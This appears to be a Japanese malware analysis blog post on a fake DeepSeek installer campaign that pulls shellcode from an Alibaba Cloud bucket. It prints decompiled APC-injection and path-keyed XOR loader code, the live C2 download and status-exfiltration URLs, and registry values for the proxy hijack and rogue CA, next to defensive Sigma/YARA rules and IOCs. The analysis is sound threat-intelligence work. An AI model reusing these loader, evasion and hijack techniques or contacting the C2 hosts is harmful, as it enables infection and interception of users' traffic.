---
date: 2026-06-27
tags: [malware]
family: Injuke/ABTrojan
platform: Windows
severity: High
---

# 169MBの"DeepSeek"がAlibaba Cloudからシェルコードを降らせる -- 偽AIインストーラー多段ローダー完全解剖 (ai-deepseeqk.com)

深夜、「DeepSeekの偽サイトがマルウェアを撒いている」という情報を追いかけていたら、`ai-deepseeqk.com` に辿り着いた。Cloudflareの後ろに隠れた、DeepSeekの公式サイトをピクセル単位でコピーした偽サイトである。

「開始対話(发送WhatsApp使用)」と「deepseek客户端下载」の2つのボタン。後者をクリックすると `/dows.html` に飛ぶ（"downloads" のtypoなのか意図的なのかは不明だが、どちらにしてもセンスは最悪である）。

ネタバレ: このインストーラーは169MBもある。DeepSeekのローカル版が169MBで収まるわけがないし、実際に収まっていない。中身はElectronアプリ、迅雷（Xunlei）のP2PダウンロードSDK、360セキュリティのDLL群、そしてAlibaba Cloud香港からシェルコードを降らせる多段ローダーだ。

ちなみに、実際のZIPファイルは `dows.szeom.com` からダウンロードされる（`ai-deepseeqk.com` はフロントで、実バイナリの配信は別ドメイン）。さらに `/dows.html` は `youlian-cn.com/zh/DeepSeekV1.0.1.6Setup.txt`（47バイト）を取得している -- バージョン確認またはダウンロード設定の取得と推定される。

> **SHA256** (ZIP): `89cc8cf9bd358b3ece9e2c1d67459b494e77f3d534ec346dd9cfbfbafdd67d22`
> **VT**: [9/75](https://www.virustotal.com/gui/file/89cc8cf9bd358b3ece9e2c1d67459b494e77f3d534ec346dd9cfbfbafdd67d22) | **Kaspersky**: Trojan.Win32.Injuke.psqi | **Tags**: `detect-debug-environment`, `long-sleeps`

---

## 「このサイト、公式だよね？」-- と思ったあなたへ

Docker隔離ブラウザで `ai-deepseeqk.com` にアクセスした（我々は野蛮人ではないので）。

サイトの完成度は正直なところ高い。DeepSeekのロゴ、ベンチマーク比較表、フッターのリンク群。だが、よく見ると全てのリンクが `/dows.html` に飛ぶ。「DeepSeek R1」も「API 开放平台」も「English」も。全部同じページ。

もっと面白いのはフッターの最下部だ:

```
chatgpt下载  perplexity下载  gemini下载  deepseek下载
```

リンク先はそれぞれ `chatgpt-pc.com`、`perplexity-pc.com`、`gemini-pc.com`、`deekseek-ai.com`。同一オペレーターが複数のAIブランドを騙ったキャンペーンを展開していることがわかる。AIブームに便乗したマルウェア配布のバーゲンセールである。

さらに、中国の分析プラットフォーム `sdk.51.la` のトラッカーが埋め込まれている。ターゲットは明確に中国語圏ユーザーだ。WhatsAppボタンのリダイレクト先 `www.whtetoasaoesppzh.cyou` も、このキャンペーンのインフラの一部と推定される。

| 項目 | 値 |
|---|---|
| 配布ドメイン | `ai-deepseeqk.com` (Cloudflare) |
| IP | `172.67.159.13`, `104.21.41.21` |
| 関連ドメイン | `chatgpt-pc.com`, `perplexity-pc.com`, `gemini-pc.com`, `deekseek-ai.com` |
| トラッカー | `sdk.51.la` / `collect-v6.51.la` |
| CMS痕跡 | WordPress (`wp-includes/js/wp-emoji-release.min.js` → 404) |
| OPSEC漏洩 | `微信图片_20250221205332.png` -- WeChatスクリーンショットのデフォルトファイル名。オペレーターがWeChatを使用しており、サイトコンテンツの一部が2025年2月21日時点で準備されていたことを示唆 |
| 訪問者追跡 | `/track.php` → 404。フィッシングキットの追跡コンポーネント（無効化済み） |

---

## マトリョーシカを開けるパート -- 静的解析

### ZIP → MSI → NSIS → App.7z → Electron

まず、このマルウェアの梱包構造を見てほしい。

```
DeepSeekV20.66-Setup.zip (169MB, VT 9/75)
└─ DeepSeekV20.66-Setup.msi (174MB, VT 9/75)
   └─ AI_ChainedPackageFile.DeepSeekV20.66.exe (113MB, NSIS, VT 1/75)
      ├─ App.7z (102MB)
      │  ├─ JZDS360Ly.exe (154MB, Electron PE32+, 15 sections)
      │  ├─ dk.dll (6.8MB, 迅雷/Xunlei P2P SDK)
      │  ├─ 360Base64.dll, 360NetBase64.dll, 360Util64.dll (Qihoo 360 SDK)
      │  ├─ dbghelp.dll (1.3MB, 正規MS DLL)
      │  ├─ catchhelper.dll (341KB, プロセス列挙+ロケール確認)
      │  ├─ node.dll (39MB, Node.js runtime)
      │  ├─ resources/app.asar (Electron app bundle)
      │  └─ ... (ffmpeg.dll, d3dcompiler_47.dll, etc.)
      ├─ config.ini (base64エンコード設定)
      └─ uninstx.exe (NSIS uninstaller)
```

ZIP → MSI → NSIS → 7z → Electron。4段階のネスト。ロシアのマトリョーシカ人形も驚きの入れ子構造である。

> **SHA256** (MSI): `e16b256d28ff34557c6ad975004ae2c392f66f65f1344780e69b6204dae97c0c`
> **VT**: [9/75](https://www.virustotal.com/gui/file/e16b256d28ff34557c6ad975004ae2c392f66f65f1344780e69b6204dae97c0c) | **AhnLab**: Dropper/Win.MalwareX-gen.C5900882

`config.ini` をBase64デコードすると、8時間ごとのクエリインターバルと `last_update_tick: 1749526642`（2025年6月10日）が見える。ビルド日のヒントだ。

### C2から降ってくるもの -- 第2段階ペイロード

Electronアプリの本当の仕事は、Alibaba Cloud香港リージョンのOSSバケットからペイロードをダウンロードすることだ。VTのbehavior reportから、C2 URL `steyyy888.oss-cn-hongkong.aliyuncs.com/zh/` に対して以下のリクエストが確認された:

| ファイル | サイズ | SHA256 | VT | 役割 |
|---|---|---|---|---|
| `ds.100` | 347KB | `b18f1209...` | data | **メインシェルコード**: Baidu確認, ロケールチェック, C2通信 |
| `ds.bin` | 291KB | `4cb8a54d...` | 8/74 | **遅延シェルコード**: Sleep最大49日, プロセス操作 |
| `1.1x1` | 252KB | `9a09faa9...` | 0/74 | **SPDDUMP.EXE**: Microsoft署名の正規バイナリ |
| `1.d00` | 209KB | `a90402ef...` | 20/73 | **ShellcodeRunner DLL**: APC injection, プロセス監視 |

`1.1x1` がVT 0/74。完全にクリーン。なぜなら、これは正真正銘のMicrosoft製 `SPDDUMP.EXE`（SPDメモリダンプツール）だからだ。マルウェア作者はこの正規バイナリを**DLLサイドローディングのホスト**として悪用している。

> **SHA256** (1.d00): `a90402ef6fb8efd2856d0523c9f0eca64b87110bd9435cff10cbcf4836fc51eb`
> **VT**: [20/73](https://www.virustotal.com/gui/file/a90402ef6fb8efd2856d0523c9f0eca64b87110bd9435cff10cbcf4836fc51eb) | **Kaspersky**: Trojan.Win32.DLLhijack.ajjf | **ESET**: Win64/ShellcodeRunner_AGen.MF

### Ghidraが教えてくれたこと

`1.d00`（ShellcodeRunner DLL）をGhidra Headlessに食わせた。

**インポート**: 93関数、うち12個が要注意（`QueueUserAPC`, `VirtualAlloc`, `VirtualProtect`, `IsDebuggerPresent`, `Sleep`, `CreateToolhelp32Snapshot`）。 APCインジェクションの香りがプンプンする。

**エクスポート**: 61関数。`PDBClose` を筆頭に、`fork`, `execve`, `pthread_create` といったCygwin/POSIX風の関数群。`entry` エクスポートがメインのエントリポイント。表面上は「PDBを扱うDLL」に見せかけているが、中身はプロセスインジェクターだ。

**YARA**: `MalDev_PEB_Walking_x64`（PEBウォーキング, T1027.007）と `MalDev_LowImports_DynamicLoader`（動的API解決, T1027.007）がヒット。PEBの `InMemoryOrderModuleList` を走査し、APIハッシュで `ntdll.dll` / `kernel32.dll` の関数を動的解決するクラシックなシェルコードパターンだ。

**注目すべき文字列**: `C:\windows\explorer.exe`（`0x180021e60`）と `NtAllocateVirtualMemory`（`0x180021f90`）、`LdrEnumerateLoadedModules`（`0x180021ff0`）が並んでいる。`explorer.exe` はモジュールスタンピング/DLLホロウイングのターゲットプロセスと推定される。候補DLL群として `d3d9`, `d3d11`, `dxgi`, `winhttp`, `bcrypt`, `ws2_32`, `iphlpapi` 等30以上のシステムDLL名が連続して格納されている。

**YY-Thunks**: `YY_ThunksSharedData_53302349-F6BE-49C4-AC98-DA275C0CE653_`（`0x180021dc0`）。これは中国のオープンソースプロジェクト [YY-Thunks](https://github.com/AmmyKhang/YY-Thunks) で、新しいWindows APIを古いOS（XP/Vista/7）でも使えるようにする互換レイヤーだ。中国の開発ツールチェーンの使用と、古いWindowsをターゲットに含める意図を示す帰属情報である。

**maldev-detect**: 3件検出。

| 重要度 | 技法 | ATT&CK | 信頼度 |
|---|---|---|---|
| HIGH | モジュールスタンピング / DLLホロウイング | T1055.013 | 0.75 |
| HIGH | VM検出（ソフトウェアフィンガープリント） | T1497.001 | 0.50 |
| MEDIUM | 時間ベースの回避（サンドボックス検知） | T1497.003 | 0.50 |

**classify**: **Loader** (70%)。インジェクション系APIの密度が高い。

---

## 49日間眠るマルウェア -- アンチフォレンジック解剖

このマルウェアの最も興味深い部分は、6種類のアンチフォレンジック技術を直列に配置していることだ。1つでも失敗すれば即座にサイレント終了する。解析者を徹底的に疲弊させるための設計である。

### 1. 百度（Baidu）接続確認

`ds.100` シェルコードのオフセット `0x4ef26` に、堂々と `https://www.baidu.com` のURLが埋め込まれている。

シェルコードは `WinHttpOpen` → `WinHttpConnect` → `WinHttpSendRequest` で百度にHTTPリクエストを送信し、応答を確認する。中国国内からインターネットに接続しているかどうかの「リトマス試験紙」だ。百度にアクセスできない環境（= 中国国外のサンドボックス）ではペイロードを展開しない。

### 2. 中国語ロケール確認

同じく `ds.100` で `GetUserDefaultLocaleName` と `EnumSystemLocalesEx` を呼び出し、`zh-CN`（簡体字中国語）をチェックしている。ワイド文字列 `zh-CN` はオフセット `0x43029` に格納されている。

日本語(`ja-JP`)、英語(`en-US`)、その他の言語環境では実行を拒否する。ターゲティングが極めて明確だ。

### 3. Sleep爆弾 -- 49日間の沈黙

`ds.bin` シェルコードに11箇所のSleep呼び出しが埋め込まれている。我々が見つけたSleep値の一覧:

| オフセット | Sleep値 | 実時間 |
|---|---|---|
| `0x1062d` | `4,294,967,295 ms` | **49.7日** |
| `0x0e4e5` | `4,294,967,295 ms` | **49.7日** |
| `0x26f4f` | `4,294,967,295 ms` | **49.7日** |
| `0x0dfd1` | `1,048,576 ms` | **17.5分** |
| `0x0c831` | `8,000 ms` | 8秒 |
| 他6箇所 | `65,001 ms` | 各1分 |

`4,294,967,295` は `0xFFFFFFFF` -- 32bit符号なし整数の最大値である。サンドボックスの標準的な監視時間は2-5分。49日待ってくれるサンドボックスは存在しない。

最高かよ。

### 4. 解析ツール検出とプロセスkill

`1.d00` の `FUN_180006900`（RVA `0x6900`）は `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)` でプロセスリストを取得し、7つのプロセス名をスタック文字列として構築して照合する。マッチしたプロセスは `FUN_1800066e0` で即座にkillされる。

これが**無限ループ**で実行される。`Sleep(1)` を挟みながら永遠にプロセスを監視し続ける。解析ツールを起動した瞬間に殺される。`360leakfixer.exe` や `HRUpdate.exe` が検出対象に含まれている。

### 5. Telegram検出

`ds.100` のオフセット `0x3a521` に `Telegram.exe` の文字列。Telegramが起動しているかチェックしている。中国のサイバー犯罪者がTelegramをOPSEC用に使うことを考えると、「仕事用のマシンでは実行しない」というセルフプロテクションの可能性が高い。

### 6. デバッガ検出

`1.d00` のIATに `IsDebuggerPresent`、`QueryPerformanceCounter`、`SetUnhandledExceptionFilter`。前者は古典的なデバッガ検出、2番目はタイミングベースのアンチデバッグ、3番目はSEH例外フィルタの置換（デバッガが接続されている場合、例外フィルタより先にデバッガが例外を捕捉するため、挙動が変わる）。`NtQueryInformationProcess` も使用可能な状態にある。

### 7. UACバイパス（COM Elevation Moniker）

`1.d00` の文字列セクション（`0x180021eb0`）に `Elevation:Administrator!new:%s` パターンが存在する。これはCOM Elevation Monikerを利用したUACバイパスの署名だ。管理者権限チェック（`FUN_180006cc0`）で非管理者と判定された場合、このモニカーを使って権限昇格を試みる可能性がある。

---

## DLLサイドローディング -- Microsoftの信頼を悪用するパート

DLLサイドローディングの構造を詳しく見てみよう。

`SPDDUMP.EXE`（`1.1x1`）はMicrosoft署名の正規バイナリで、`mspdb140.dll` から2つの関数をインポートしている:

```
DLL: mspdb140.dll
  PDBOpen2W (hint=233)
  PDBClose (hint=219)
```

マルウェアDLL（`1.d00`）は `PDBClose` をエクスポートしており、`mspdb140.dll` としてリネームされることでサイドローディングが成立する。

DllMainの処理はシンプルだが効果的だ:

```c
void FUN_18000b3b0(undefined8 param_1, int param_2) {
    FreeConsole();                              // [0]
    if (param_2 == 1) {                         // [1]
        FreeConsole();
        hThread = GetCurrentThread();
        QueueUserAPC(FUN_180008bf0, hThread, 0); // [2]
    }
    return 1;
}
```

`[0]` でコンソールを切り離し、`[1]` で `DLL_PROCESS_ATTACH` を確認、`[2]` で**APC injection** -- メインスレッドにペイロード関数を注入する。`SleepEx` のalertable waitでAPCが発火する。

---

## XMLに偽装したシェルコード -- 深掘りパート

APCペイロード `FUN_180008bf0` の挙動が最も技術的に興味深い。

1. `FUN_180006cc0()` で**管理者権限チェック**（`OpenProcessToken` + `GetTokenInformation(TokenElevation)`）
2. 管理者なら `FUN_18000b2c0()` でプロセスキラースレッドを起動
3. `GetModuleFileNameA(NULL)` で**ホストEXEのパス**を取得（NULLなのでDLLではなくEXEのパスが返る）
4. 同一ディレクトリで `*.xml` パターンの `FindFirstFileA` / `FindNextFileA`
5. 各XMLファイルを読み込み
6. **ファイルパス依存のXOR復号**
7. `VirtualAlloc(PAGE_EXECUTE_READWRITE)` → メモリコピー → **関数ポインタとして実行**

XOR復号アルゴリズム（`FUN_180009130`）は、ファイルのフルパス（UTF-16LE）から1バイトの鍵を導出する:

```c
byte key = 0x5A;
for (wchar_t *p = fullPath; *p != L'\0'; p++) {
    key ^= (byte)*p;
    key = ROL(key, 1);  // 1bit左ローテート
}
// keyで全バイトをXOR復号
```

つまり、**ファイルを別のディレクトリに移動するだけで復号に失敗する**。フォレンジックアナリストが検体を回収して別のマシンで解析しようとすると、パスが変わるため正しく復号できない。地味だが効果的なアンチフォレンジックである。

我々はVM内で実際にXOR鍵を検証した。パス `C:\Users\malwa\Desktop\analysis\deepseek_patched\payload1.xml` に対して鍵 `0x4D` が導出され、復号結果の先頭8バイトが `48 81 EC C8 02 00 00 48`（`sub rsp, 0x2C8` -- シェルコードのプロローグ）と一致した。

---

## 「実行したらElectronアプリが起動した」-- 動的解析パート

### 環境

- VMware Workstation Pro, Windows 10 x64
- ロケール: `zh-CN`（中国語簡体字に変更）
- ネットワーク: NAT（C2通信キャプチャのため）

### 実行結果

MSIインストールはexit code 0で成功。`C:\Program Files (x86)\DeepSeekV20.66\` にファイルが展開された。

その後、NSISインストーラーが `%TEMP%\nsk3887.tmp\` にプラグインDLL群を展開し、最終的にマルウェア本体を `%AppData%\Roaming\DeepSeekV20.66\` に配置した:

```
%AppData%\Roaming\DeepSeekV20.66\DeepSeekV20.66\prerequisites\
├── aipackagechainer.exe    ← マルウェアチェイナー（常駐）
├── aipackagechainer.ini    ← 設定ファイル
├── file_deleter.ps1        ← クリーンアップスクリプト
└── DS本地部署工具\          ← 「DS Local Deployment Tool」
    └── DeepSeekV20.66.exe  ← 偽DeepSeekアプリ（Electron）
```

10分間の監視で `aipackagechainer` と `DeepSeekV20.66` プロセスが**連続稼働**していることを確認した。`ChsIME`（中国語IME）も自動起動した -- `zh-CN` ロケール依存の裏付けである。

### C2通信パターン

VT behaviorから、以下のC2通信パターンが確認されている:

```
GET https://steyyy888.oss-cn-hongkong.aliyuncs.com/zh/ds.100    [200]
GET https://steyyy888.oss-cn-hongkong.aliyuncs.com/zh/ds.bin    [200]
GET https://steyyy888.oss-cn-hongkong.aliyuncs.com/zh/1.1x1    [200]
GET https://steyyy888.oss-cn-hongkong.aliyuncs.com/zh/1.d00    [200]
```

ステータスログはURL パラメータで送信される（GETリクエストのパスにログ内容を埋め込む）:

```
/upload?log=PathInit:C:\Users\<USER>\AppData\Local\Programs\_2693624903
/upload?log=AddTask:...\DefService.exe
/upload?log=CreateAndExecuteTask:{383D6128-FE77-4F34-AD73-0A4FE372C7AE}
```

C2サーバーは404を返す（OSSバケットにそのパスは存在しない）が、ログの「送信」自体はGETリクエストで完了している。URL自体がデータ送信チャネルだ。

二次C2として `zh.szeom.com:5947` (TCP) への通信も確認されている。

---

## 偽装と永続化

### インストーラーの偽装

- MSIの `ProductName`: `DeepSeekV20.66`
- インストール先: `C:\Program Files (x86)\DeepSeekV20.66\` -- 正規アプリのような体裁
- NSISインストーラーのUI: 中国語/英語の言語リソース、「同意して続行」ダイアログ

### Program Files側: `Xshell-8.0.0057p.exe` の正体 -- 二重感染設計

MSI内の `Binary.SetupAPP3.exe` が `C:\Program Files (x86)\DeepSeekV20.66\DeepSeekV20.66\Xshell-8.0.0057p.exe` として配置される。正規のXshell Remote Clientを名乗っているが、**実態は.NETトロイの木馬**（VT 34/75、Trojan.Yogi/Injuke）であり、Xshellとは一切関係がない。

> **SHA256**: `d5d5659d070195a51bc2bf3c364e80efdce8e2b80beb02861855e261c4e065d1`
> **VT**: [34/75](https://www.virustotal.com/gui/file/d5d5659d070195a51bc2bf3c364e80efdce8e2b80beb02861855e261c4e065d1) | **PDB**: `C:\uninstall\bin\Release\net10.0\win-x64\native\Uninstall.pdb`（.NET 10 AOTコンパイル）

このバイナリは `aipackagechainer`（AppData側）とは**独立して動作する第二の感染経路**であり、以下の挙動を示す:

**1. 同一C2と通信**

AppData側の `aipackagechainer` と同じC2（`steyyy888.oss-cn-hongkong.aliyuncs.com/zh/`）に接続し、同じ4つのペイロード（`ds.100`, `ds.bin`, `1.1x1`, `1.d00`）をダウンロードする。C2インフラを共有する冗長設計。

**2. 大量の偽Windowsファイルをドロップ**

`%LOCALAPPDATA%\Programs\_XXXXXXXXX\ar-SA\` 配下に `fed` プレフィクス付きの偽Windowsファイルを20個以上展開:

| ドロップされるファイル | 偽装対象の正規Windowsファイル |
|---|---|
| `fedtaskeng.exe` | `taskeng.exe`（タスクスケジューラエンジン） |
| `fedOptionalFeatures.exe` | `OptionalFeatures.exe`（Windows機能管理） |
| `fedSnippingTool.exe` | `SnippingTool.exe`（画面キャプチャ） |
| `fedmsdt.exe` | `msdt.exe`（Microsoft Support Diagnostic Tool） |
| `fedGettingStarted.exe` | `GettingStarted.exe`（Windowsセットアップ） |
| `fedxpsrchvw.exe` | `xpsrchvw.exe`（XPSビューア） |
| `fedfdBth.dll`, `fedtapi32.dll`, `fednewdev.dll` 等 | 各種Windowsシステムコンポーネント |

正規Windowsファイル名に `fed` を付与して大量にばら撒くことで、プロセスリストやファイルスキャンで個々のファイルが目立たないようにカモフラージュしている。

**3. プロキシ設定改ざん + GoProxy証明書のインストール**

レジストリの `ProxyEnable = 1`, `ProxyServer = %HTTP_PROXY%:8080` を設定し、GoProxy（Go製のMITMプロキシ）のルート証明書をWindowsの証明書ストアにインストールする。これにより**ブラウザを含む全てのHTTPS通信を中間者攻撃できる状態**になる。

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable = 1
HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer = %HTTP_PROXY%:8080
HKCU\Software\Microsoft\SystemCertificates\Root\Certificates\0174E68C... → GoProxy CA証明書
```

**4. 二重感染の設計意図**

Program Files側（`Xshell-8.0.0057p.exe`）とAppData側（`aipackagechainer`）は**独立して同じC2と通信する冗長構成**である。片方が駆除されてももう片方が生き残る設計の可能性が高い。さらに、Program Files側はプロキシ改ざん+証明書インストールという**AppData側にはない追加機能**を持っており、単なるバックアップではなく機能的に分担している:

| 経路 | 配置先 | 役割 |
|---|---|---|
| AppData側 | `%AppData%\Roaming\DeepSeekV20.66\` | マルウェアチェイナー + 偽DeepSeekアプリ + C2ペイロードDL |
| Program Files側 | `C:\Program Files (x86)\DeepSeekV20.66\` | 同一C2ペイロードDL + **プロキシ改ざん + GoProxy CA証明書** + 偽Windowsファイル大量ドロップ |

### 永続化

VT behaviorから:
- `DefService.exe` が `%LOCALAPPDATA%\Programs\_2693624903\` に作成される
- スケジュールタスク GUID `{383D6128-FE77-4F34-AD73-0A4FE372C7AE}` で登録
- `file_deleter.ps1` がインストーラー痕跡を削除（アンチフォレンジック）

---

## ファミリ帰属

| 指標 | 値 | 根拠 |
|---|---|---|
| VT分類 | Trojan.Win32.Injuke / ABTrojan.BACK | Kaspersky, Varist |
| VTタグ | `detect-debug-environment`, `long-sleeps`, `checks-usb-bus` | behavior解析 |
| 中国語ターゲティング | 百度チェック, zh-CNロケール, 51.la トラッカー, 中国語フォルダ名 | 静的+動的 |
| WeChatの使用 | サイト画像 `微信图片_20250221205332.png`（WeChatスクリーンショット, 2025-02-21） | OSINT |
| 開発ツールチェーン | YY-Thunks（中国製互換レイヤー）, NSIS中国語UI | 静的解析 |
| インフラ | Alibaba Cloud HK (steyyy888), szeom.com (dows/zh), Cloudflare | OSINTネットワーク情報 |
| ツール | 迅雷SDK, 360 SDK, NSIS, Electron | Stage 1構成 |
| DLLサイドローディング | SPDDUMP.EXE → mspdb140.dll | 正規MS署名悪用 |

中国語圏を明確にターゲットとした、AIブーム便乗型のマルウェア配布キャンペーンである。複数のAIブランド（ChatGPT, Perplexity, Gemini, DeepSeek）を騙るインフラを並行運用しており、同一オペレーターまたはグループによる組織的な活動と推定される。

---

## で、どうすればいいのか

### 即時対応

- [ ] `ai-deepseeqk.com`, `chatgpt-pc.com`, `perplexity-pc.com`, `gemini-pc.com`, `deekseek-ai.com` をDNSブロック
- [ ] `steyyy888.oss-cn-hongkong.aliyuncs.com` をプロキシ/FWでブロック
- [ ] `zh.szeom.com` をブロック
- [ ] `%AppData%\Roaming\DeepSeekV20.66\` の存在を確認
- [ ] `%LOCALAPPDATA%\Programs\_2693624903\` の存在を確認
- [ ] スケジュールタスクで `DefService.exe` を参照するものを削除

### Detection Rules

**Sigma** -- aipackagechainer実行検出:

```yaml
title: DeepSeek Fake Installer - aipackagechainer Execution
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\aipackagechainer.exe'
    selection_path:
        Image|contains: 'DeepSeekV20'
    condition: selection or selection_path
level: high
```

**Sigma** -- C2通信検出:

```yaml
title: DeepSeek Fake Installer - Alibaba Cloud OSS C2
status: experimental
logsource:
    category: proxy
detection:
    selection:
        c-uri|contains:
            - 'steyyy888.oss-cn-hongkong.aliyuncs.com'
            - 'dows.szeom.com'
            - 'youlian-cn.com'
            - '/upload?log=PathInit'
            - '/upload?log=AddTask'
    condition: selection
level: critical
```

**YARA** -- XOR復号ルーチン検出:

```yara
rule DeepSeek_Fake_Installer_XOR_Loader
{
    meta:
        description = "Detects XOR shellcode loader from DeepSeek fake installer"
        author = "cc-re-toolkit"
        date = "2026-06-27"

    strings:
        $xor_init = { B0 5A }  // mov al, 0x5A (XOR key init)
        $pdb_close = "PDBClose" ascii
        $xml_pattern = "*.xml" ascii
        $upload_log = "/upload?log=" ascii

    condition:
        uint16(0) == 0x5A4D and
        2 of them
}
```

---

## IOCまとめ

### Network

| タイプ | 値 | 備考 |
|---|---|---|
| Domain | `ai-deepseeqk.com` | マルウェア配布サイト |
| Domain | `chatgpt-pc.com` | 関連キャンペーン |
| Domain | `perplexity-pc.com` | 関連キャンペーン |
| Domain | `gemini-pc.com` | 関連キャンペーン |
| Domain | `deekseek-ai.com` | 関連キャンペーン |
| Download Host | `dows.szeom.com` | ZIP実バイナリ配信（`ai-deepseeqk.com` のバックエンド） |
| Config Host | `youlian-cn.com` | バージョン確認 (`/zh/DeepSeekV1.0.1.6Setup.txt`, 47B) |
| C2 | `steyyy888.oss-cn-hongkong.aliyuncs.com/zh/` | Alibaba Cloud HK, ペイロード配信+ログexfil |
| C2 | `zh.szeom.com:5947` | 二次C2 (TCP) |
| URL Pattern | `/upload?log=PathInit:` | 感染ステータスexfil |
| URL Pattern | `/upload?log=AddTask:` | 永続化ステータスexfil |
| Tracker | `sdk.51.la` | 中国の分析プラットフォーム |

### File

| ファイル | SHA256 | VT |
|---|---|---|
| DeepSeekV20.66-Setup.zip | `89cc8cf9bd358b3ece9e2c1d67459b494e77f3d534ec346dd9cfbfbafdd67d22` (MD5: `60fa87fe7b0b8dcbff9473f4d41e4d53`, SHA1: `7bc276e769db09c71e6ab177db838ec9281c486d`) | 9/75 |
| DeepSeekV20.66-Setup.msi | `e16b256d28ff34557c6ad975004ae2c392f66f65f1344780e69b6204dae97c0c` | 9/75 |
| NSIS installer | `f35c08fae77bcc13fdaa940fea21446fb78444fc2c6232abf4a2dd2d8890971a` | 1/75 |
| SetupAPP3.exe (偽Xshell) | `d5d5659d070195a51bc2bf3c364e80efdce8e2b80beb02861855e261c4e065d1` | 34/75 |
| ds.100 (shellcode) | `b18f12098b66bd0f7b7ac7da73d9a7f757ff8b3d2754a7c08015cacc2adbe5dd` | - |
| ds.bin (shellcode) | `4cb8a54db1b71a95ebf4953ec91a288ef1d004b6dd6fe6811dac2e636e4d3d67` | 8/74 |
| 1.1x1 (SPDDUMP.EXE) | `9a09faa9fa833f1810094c1a71e43217ff82e4861e3c63cea7670434b8d8229d` | 0/74 |
| 1.d00 (ShellcodeRunner) | `a90402ef6fb8efd2856d0523c9f0eca64b87110bd9435cff10cbcf4836fc51eb` | 20/73 |

### Host

| タイプ | 値 |
|---|---|
| Install Path | `C:\Program Files (x86)\DeepSeekV20.66\` |
| Malware Path | `%AppData%\Roaming\DeepSeekV20.66\DeepSeekV20.66\prerequisites\` |
| Persistence | `%LOCALAPPDATA%\Programs\_2693624903\DefService.exe` |
| Scheduled Task | `{383D6128-FE77-4F34-AD73-0A4FE372C7AE}` |
| Process | `aipackagechainer.exe` |
| Cleanup Script | `file_deleter.ps1` |
| Fake Xshell | `C:\Program Files (x86)\DeepSeekV20.66\DeepSeekV20.66\Xshell-8.0.0057p.exe` |
| Fake Windows files | `%LOCALAPPDATA%\Programs\_XXXXXXXXX\ar-SA\fed*.exe`, `fed*.dll` |
| Proxy hijack | `HKCU\...\Internet Settings\ProxyEnable = 1`, `ProxyServer = %HTTP_PROXY%:8080` |
| GoProxy CA cert | `HKCU\...\SystemCertificates\Root\Certificates\0174E68C...` |

---

## MITRE ATT&CK

| Tactic | Technique | ID | 根拠 |
|---|---|---|---|
| Initial Access | Drive-by Compromise | T1189 | 偽DeepSeekサイトからのダウンロード |
| Execution | User Execution: Malicious File | T1204.002 | MSIインストーラー実行 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | `file_deleter.ps1` |
| Persistence | Scheduled Task/Job | T1053.005 | スケジュールタスク登録 |
| Defense Evasion | DLL Side-Loading | T1574.002 | SPDDUMP.EXE → mspdb140.dll |
| Defense Evasion | Process Injection: APC Injection | T1055.004 | QueueUserAPC |
| Defense Evasion | Virtualization/Sandbox Evasion: System Checks | T1497.001 | IsDebuggerPresent, CPUID |
| Defense Evasion | Virtualization/Sandbox Evasion: Time Based Evasion | T1497.003 | Sleep(49日), QueryPerformanceCounter |
| Defense Evasion | Obfuscated Files or Information | T1027 | XORパス暗号化, XMLシェルコード |
| Defense Evasion | Dynamic API Resolution | T1027.007 | PEB walking + APIハッシュ解決 (YARA: MalDev_PEB_Walking_x64) |
| Defense Evasion | Abuse Elevation Control Mechanism: UAC Bypass | T1548.002 | COM Elevation Moniker (`Elevation:Administrator!new:%s`) |
| Defense Evasion | Indicator Removal: File Deletion | T1070.004 | file_deleter.ps1 |
| Discovery | Process Discovery | T1057 | CreateToolhelp32Snapshot + Process32FirstW/NextW |
| Discovery | System Information Discovery | T1082 | GetUserDefaultLocaleName, Baidu check |
| Command and Control | Web Service: Bidirectional Communication | T1102.002 | Alibaba Cloud OSS (steyyy888) |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTPS GET/POST |
| Collection | Man-in-the-Middle | T1557 | GoProxy CA証明書インストール + プロキシ設定改ざん (ProxyEnable=1, port 8080) |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 | `Xshell-8.0.0057p.exe` (偽Xshell), `fed*.exe/dll` (偽Windowsファイル) |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | URL パラメータでステータスexfil |

---

## 解析タイムライン

| 時刻 | 作業 |
|---|---|
| 23:01 | `malware-fetch` で `ai-deepseeqk.com` アクセス、サイトキャプチャ |
| 23:02 | `/dows.html` アクセス、`DeepSeekV20.66-Setup.zip` ダウンロード (VT 9/75) |
| 23:03 | VT behavior, check, lookup で MSI/ZIP 詳細取得 |
| 23:04 | Ghidra Docker内でZIP → MSI → NSIS → App.7z 多段展開 |
| 23:06 | NSISインストーラーからApp.7z展開、全コンポーネント特定 |
| 23:10 | catchhelper.dll strings分析 → Chinese-simplified, IsDebuggerPresent |
| 23:14 | C2 (steyyy888) から ds.100, ds.bin, 1.1x1, 1.d00 直接ダウンロード |
| 23:15 | ds.100/ds.bin = shellcode, 1.1x1 = PE, 1.d00 = DLL と判定 |
| 23:17 | 1.d00 Ghidra full analysis (7scripts) + YARA + classify + maldev-detect |
| 23:19 | ds.100 Ghidra decompile (x64 raw binary, 1246関数) |
| 23:22 | Baidu URL, C2 URL, Process32, zh-CN, Telegram.exe 文字列特定 |
| 23:24 | アンチフォレンジックバイパスパッチ作成 (v1-v5, 37パッチ) |
| 23:30 | VMware sandbox動的解析開始 (DLLサイドローディング試行) |
| 23:47 | APC injection確認 (SleepEx → 0xC0 = WAIT_IO_COMPLETION) |
| 23:55 | XMLベースシェルコードローダー機構解明 (XORパス暗号化) |
| 00:00 | XOR鍵検証成功 (key=0x4D, 先頭8バイト=シェルコードプロローグ) |
| 00:02 | VEHクラッシュ検出: Addr=0x0 (NULLポインタ) → 内部関数テーブル未初期化 |
| 00:08 | GetModuleFileNameA(NULL) 問題発見 → EXEパス返却 → XMLファイル不検出 |
| 00:47 | カスタムローダーEXE作成 → 正しいディレクトリからの実行確認 |
| 02:59 | 完全インフェクションチェーン実行 (zh-CN + NATモード) |
| 03:35 | MSIインストール成功 → aipackagechainer + DeepSeekV20.66 起動確認 |
| 03:45 | フォレンジックデータ収集完了 (21新規ファイル, 87新規プロセス) |

---

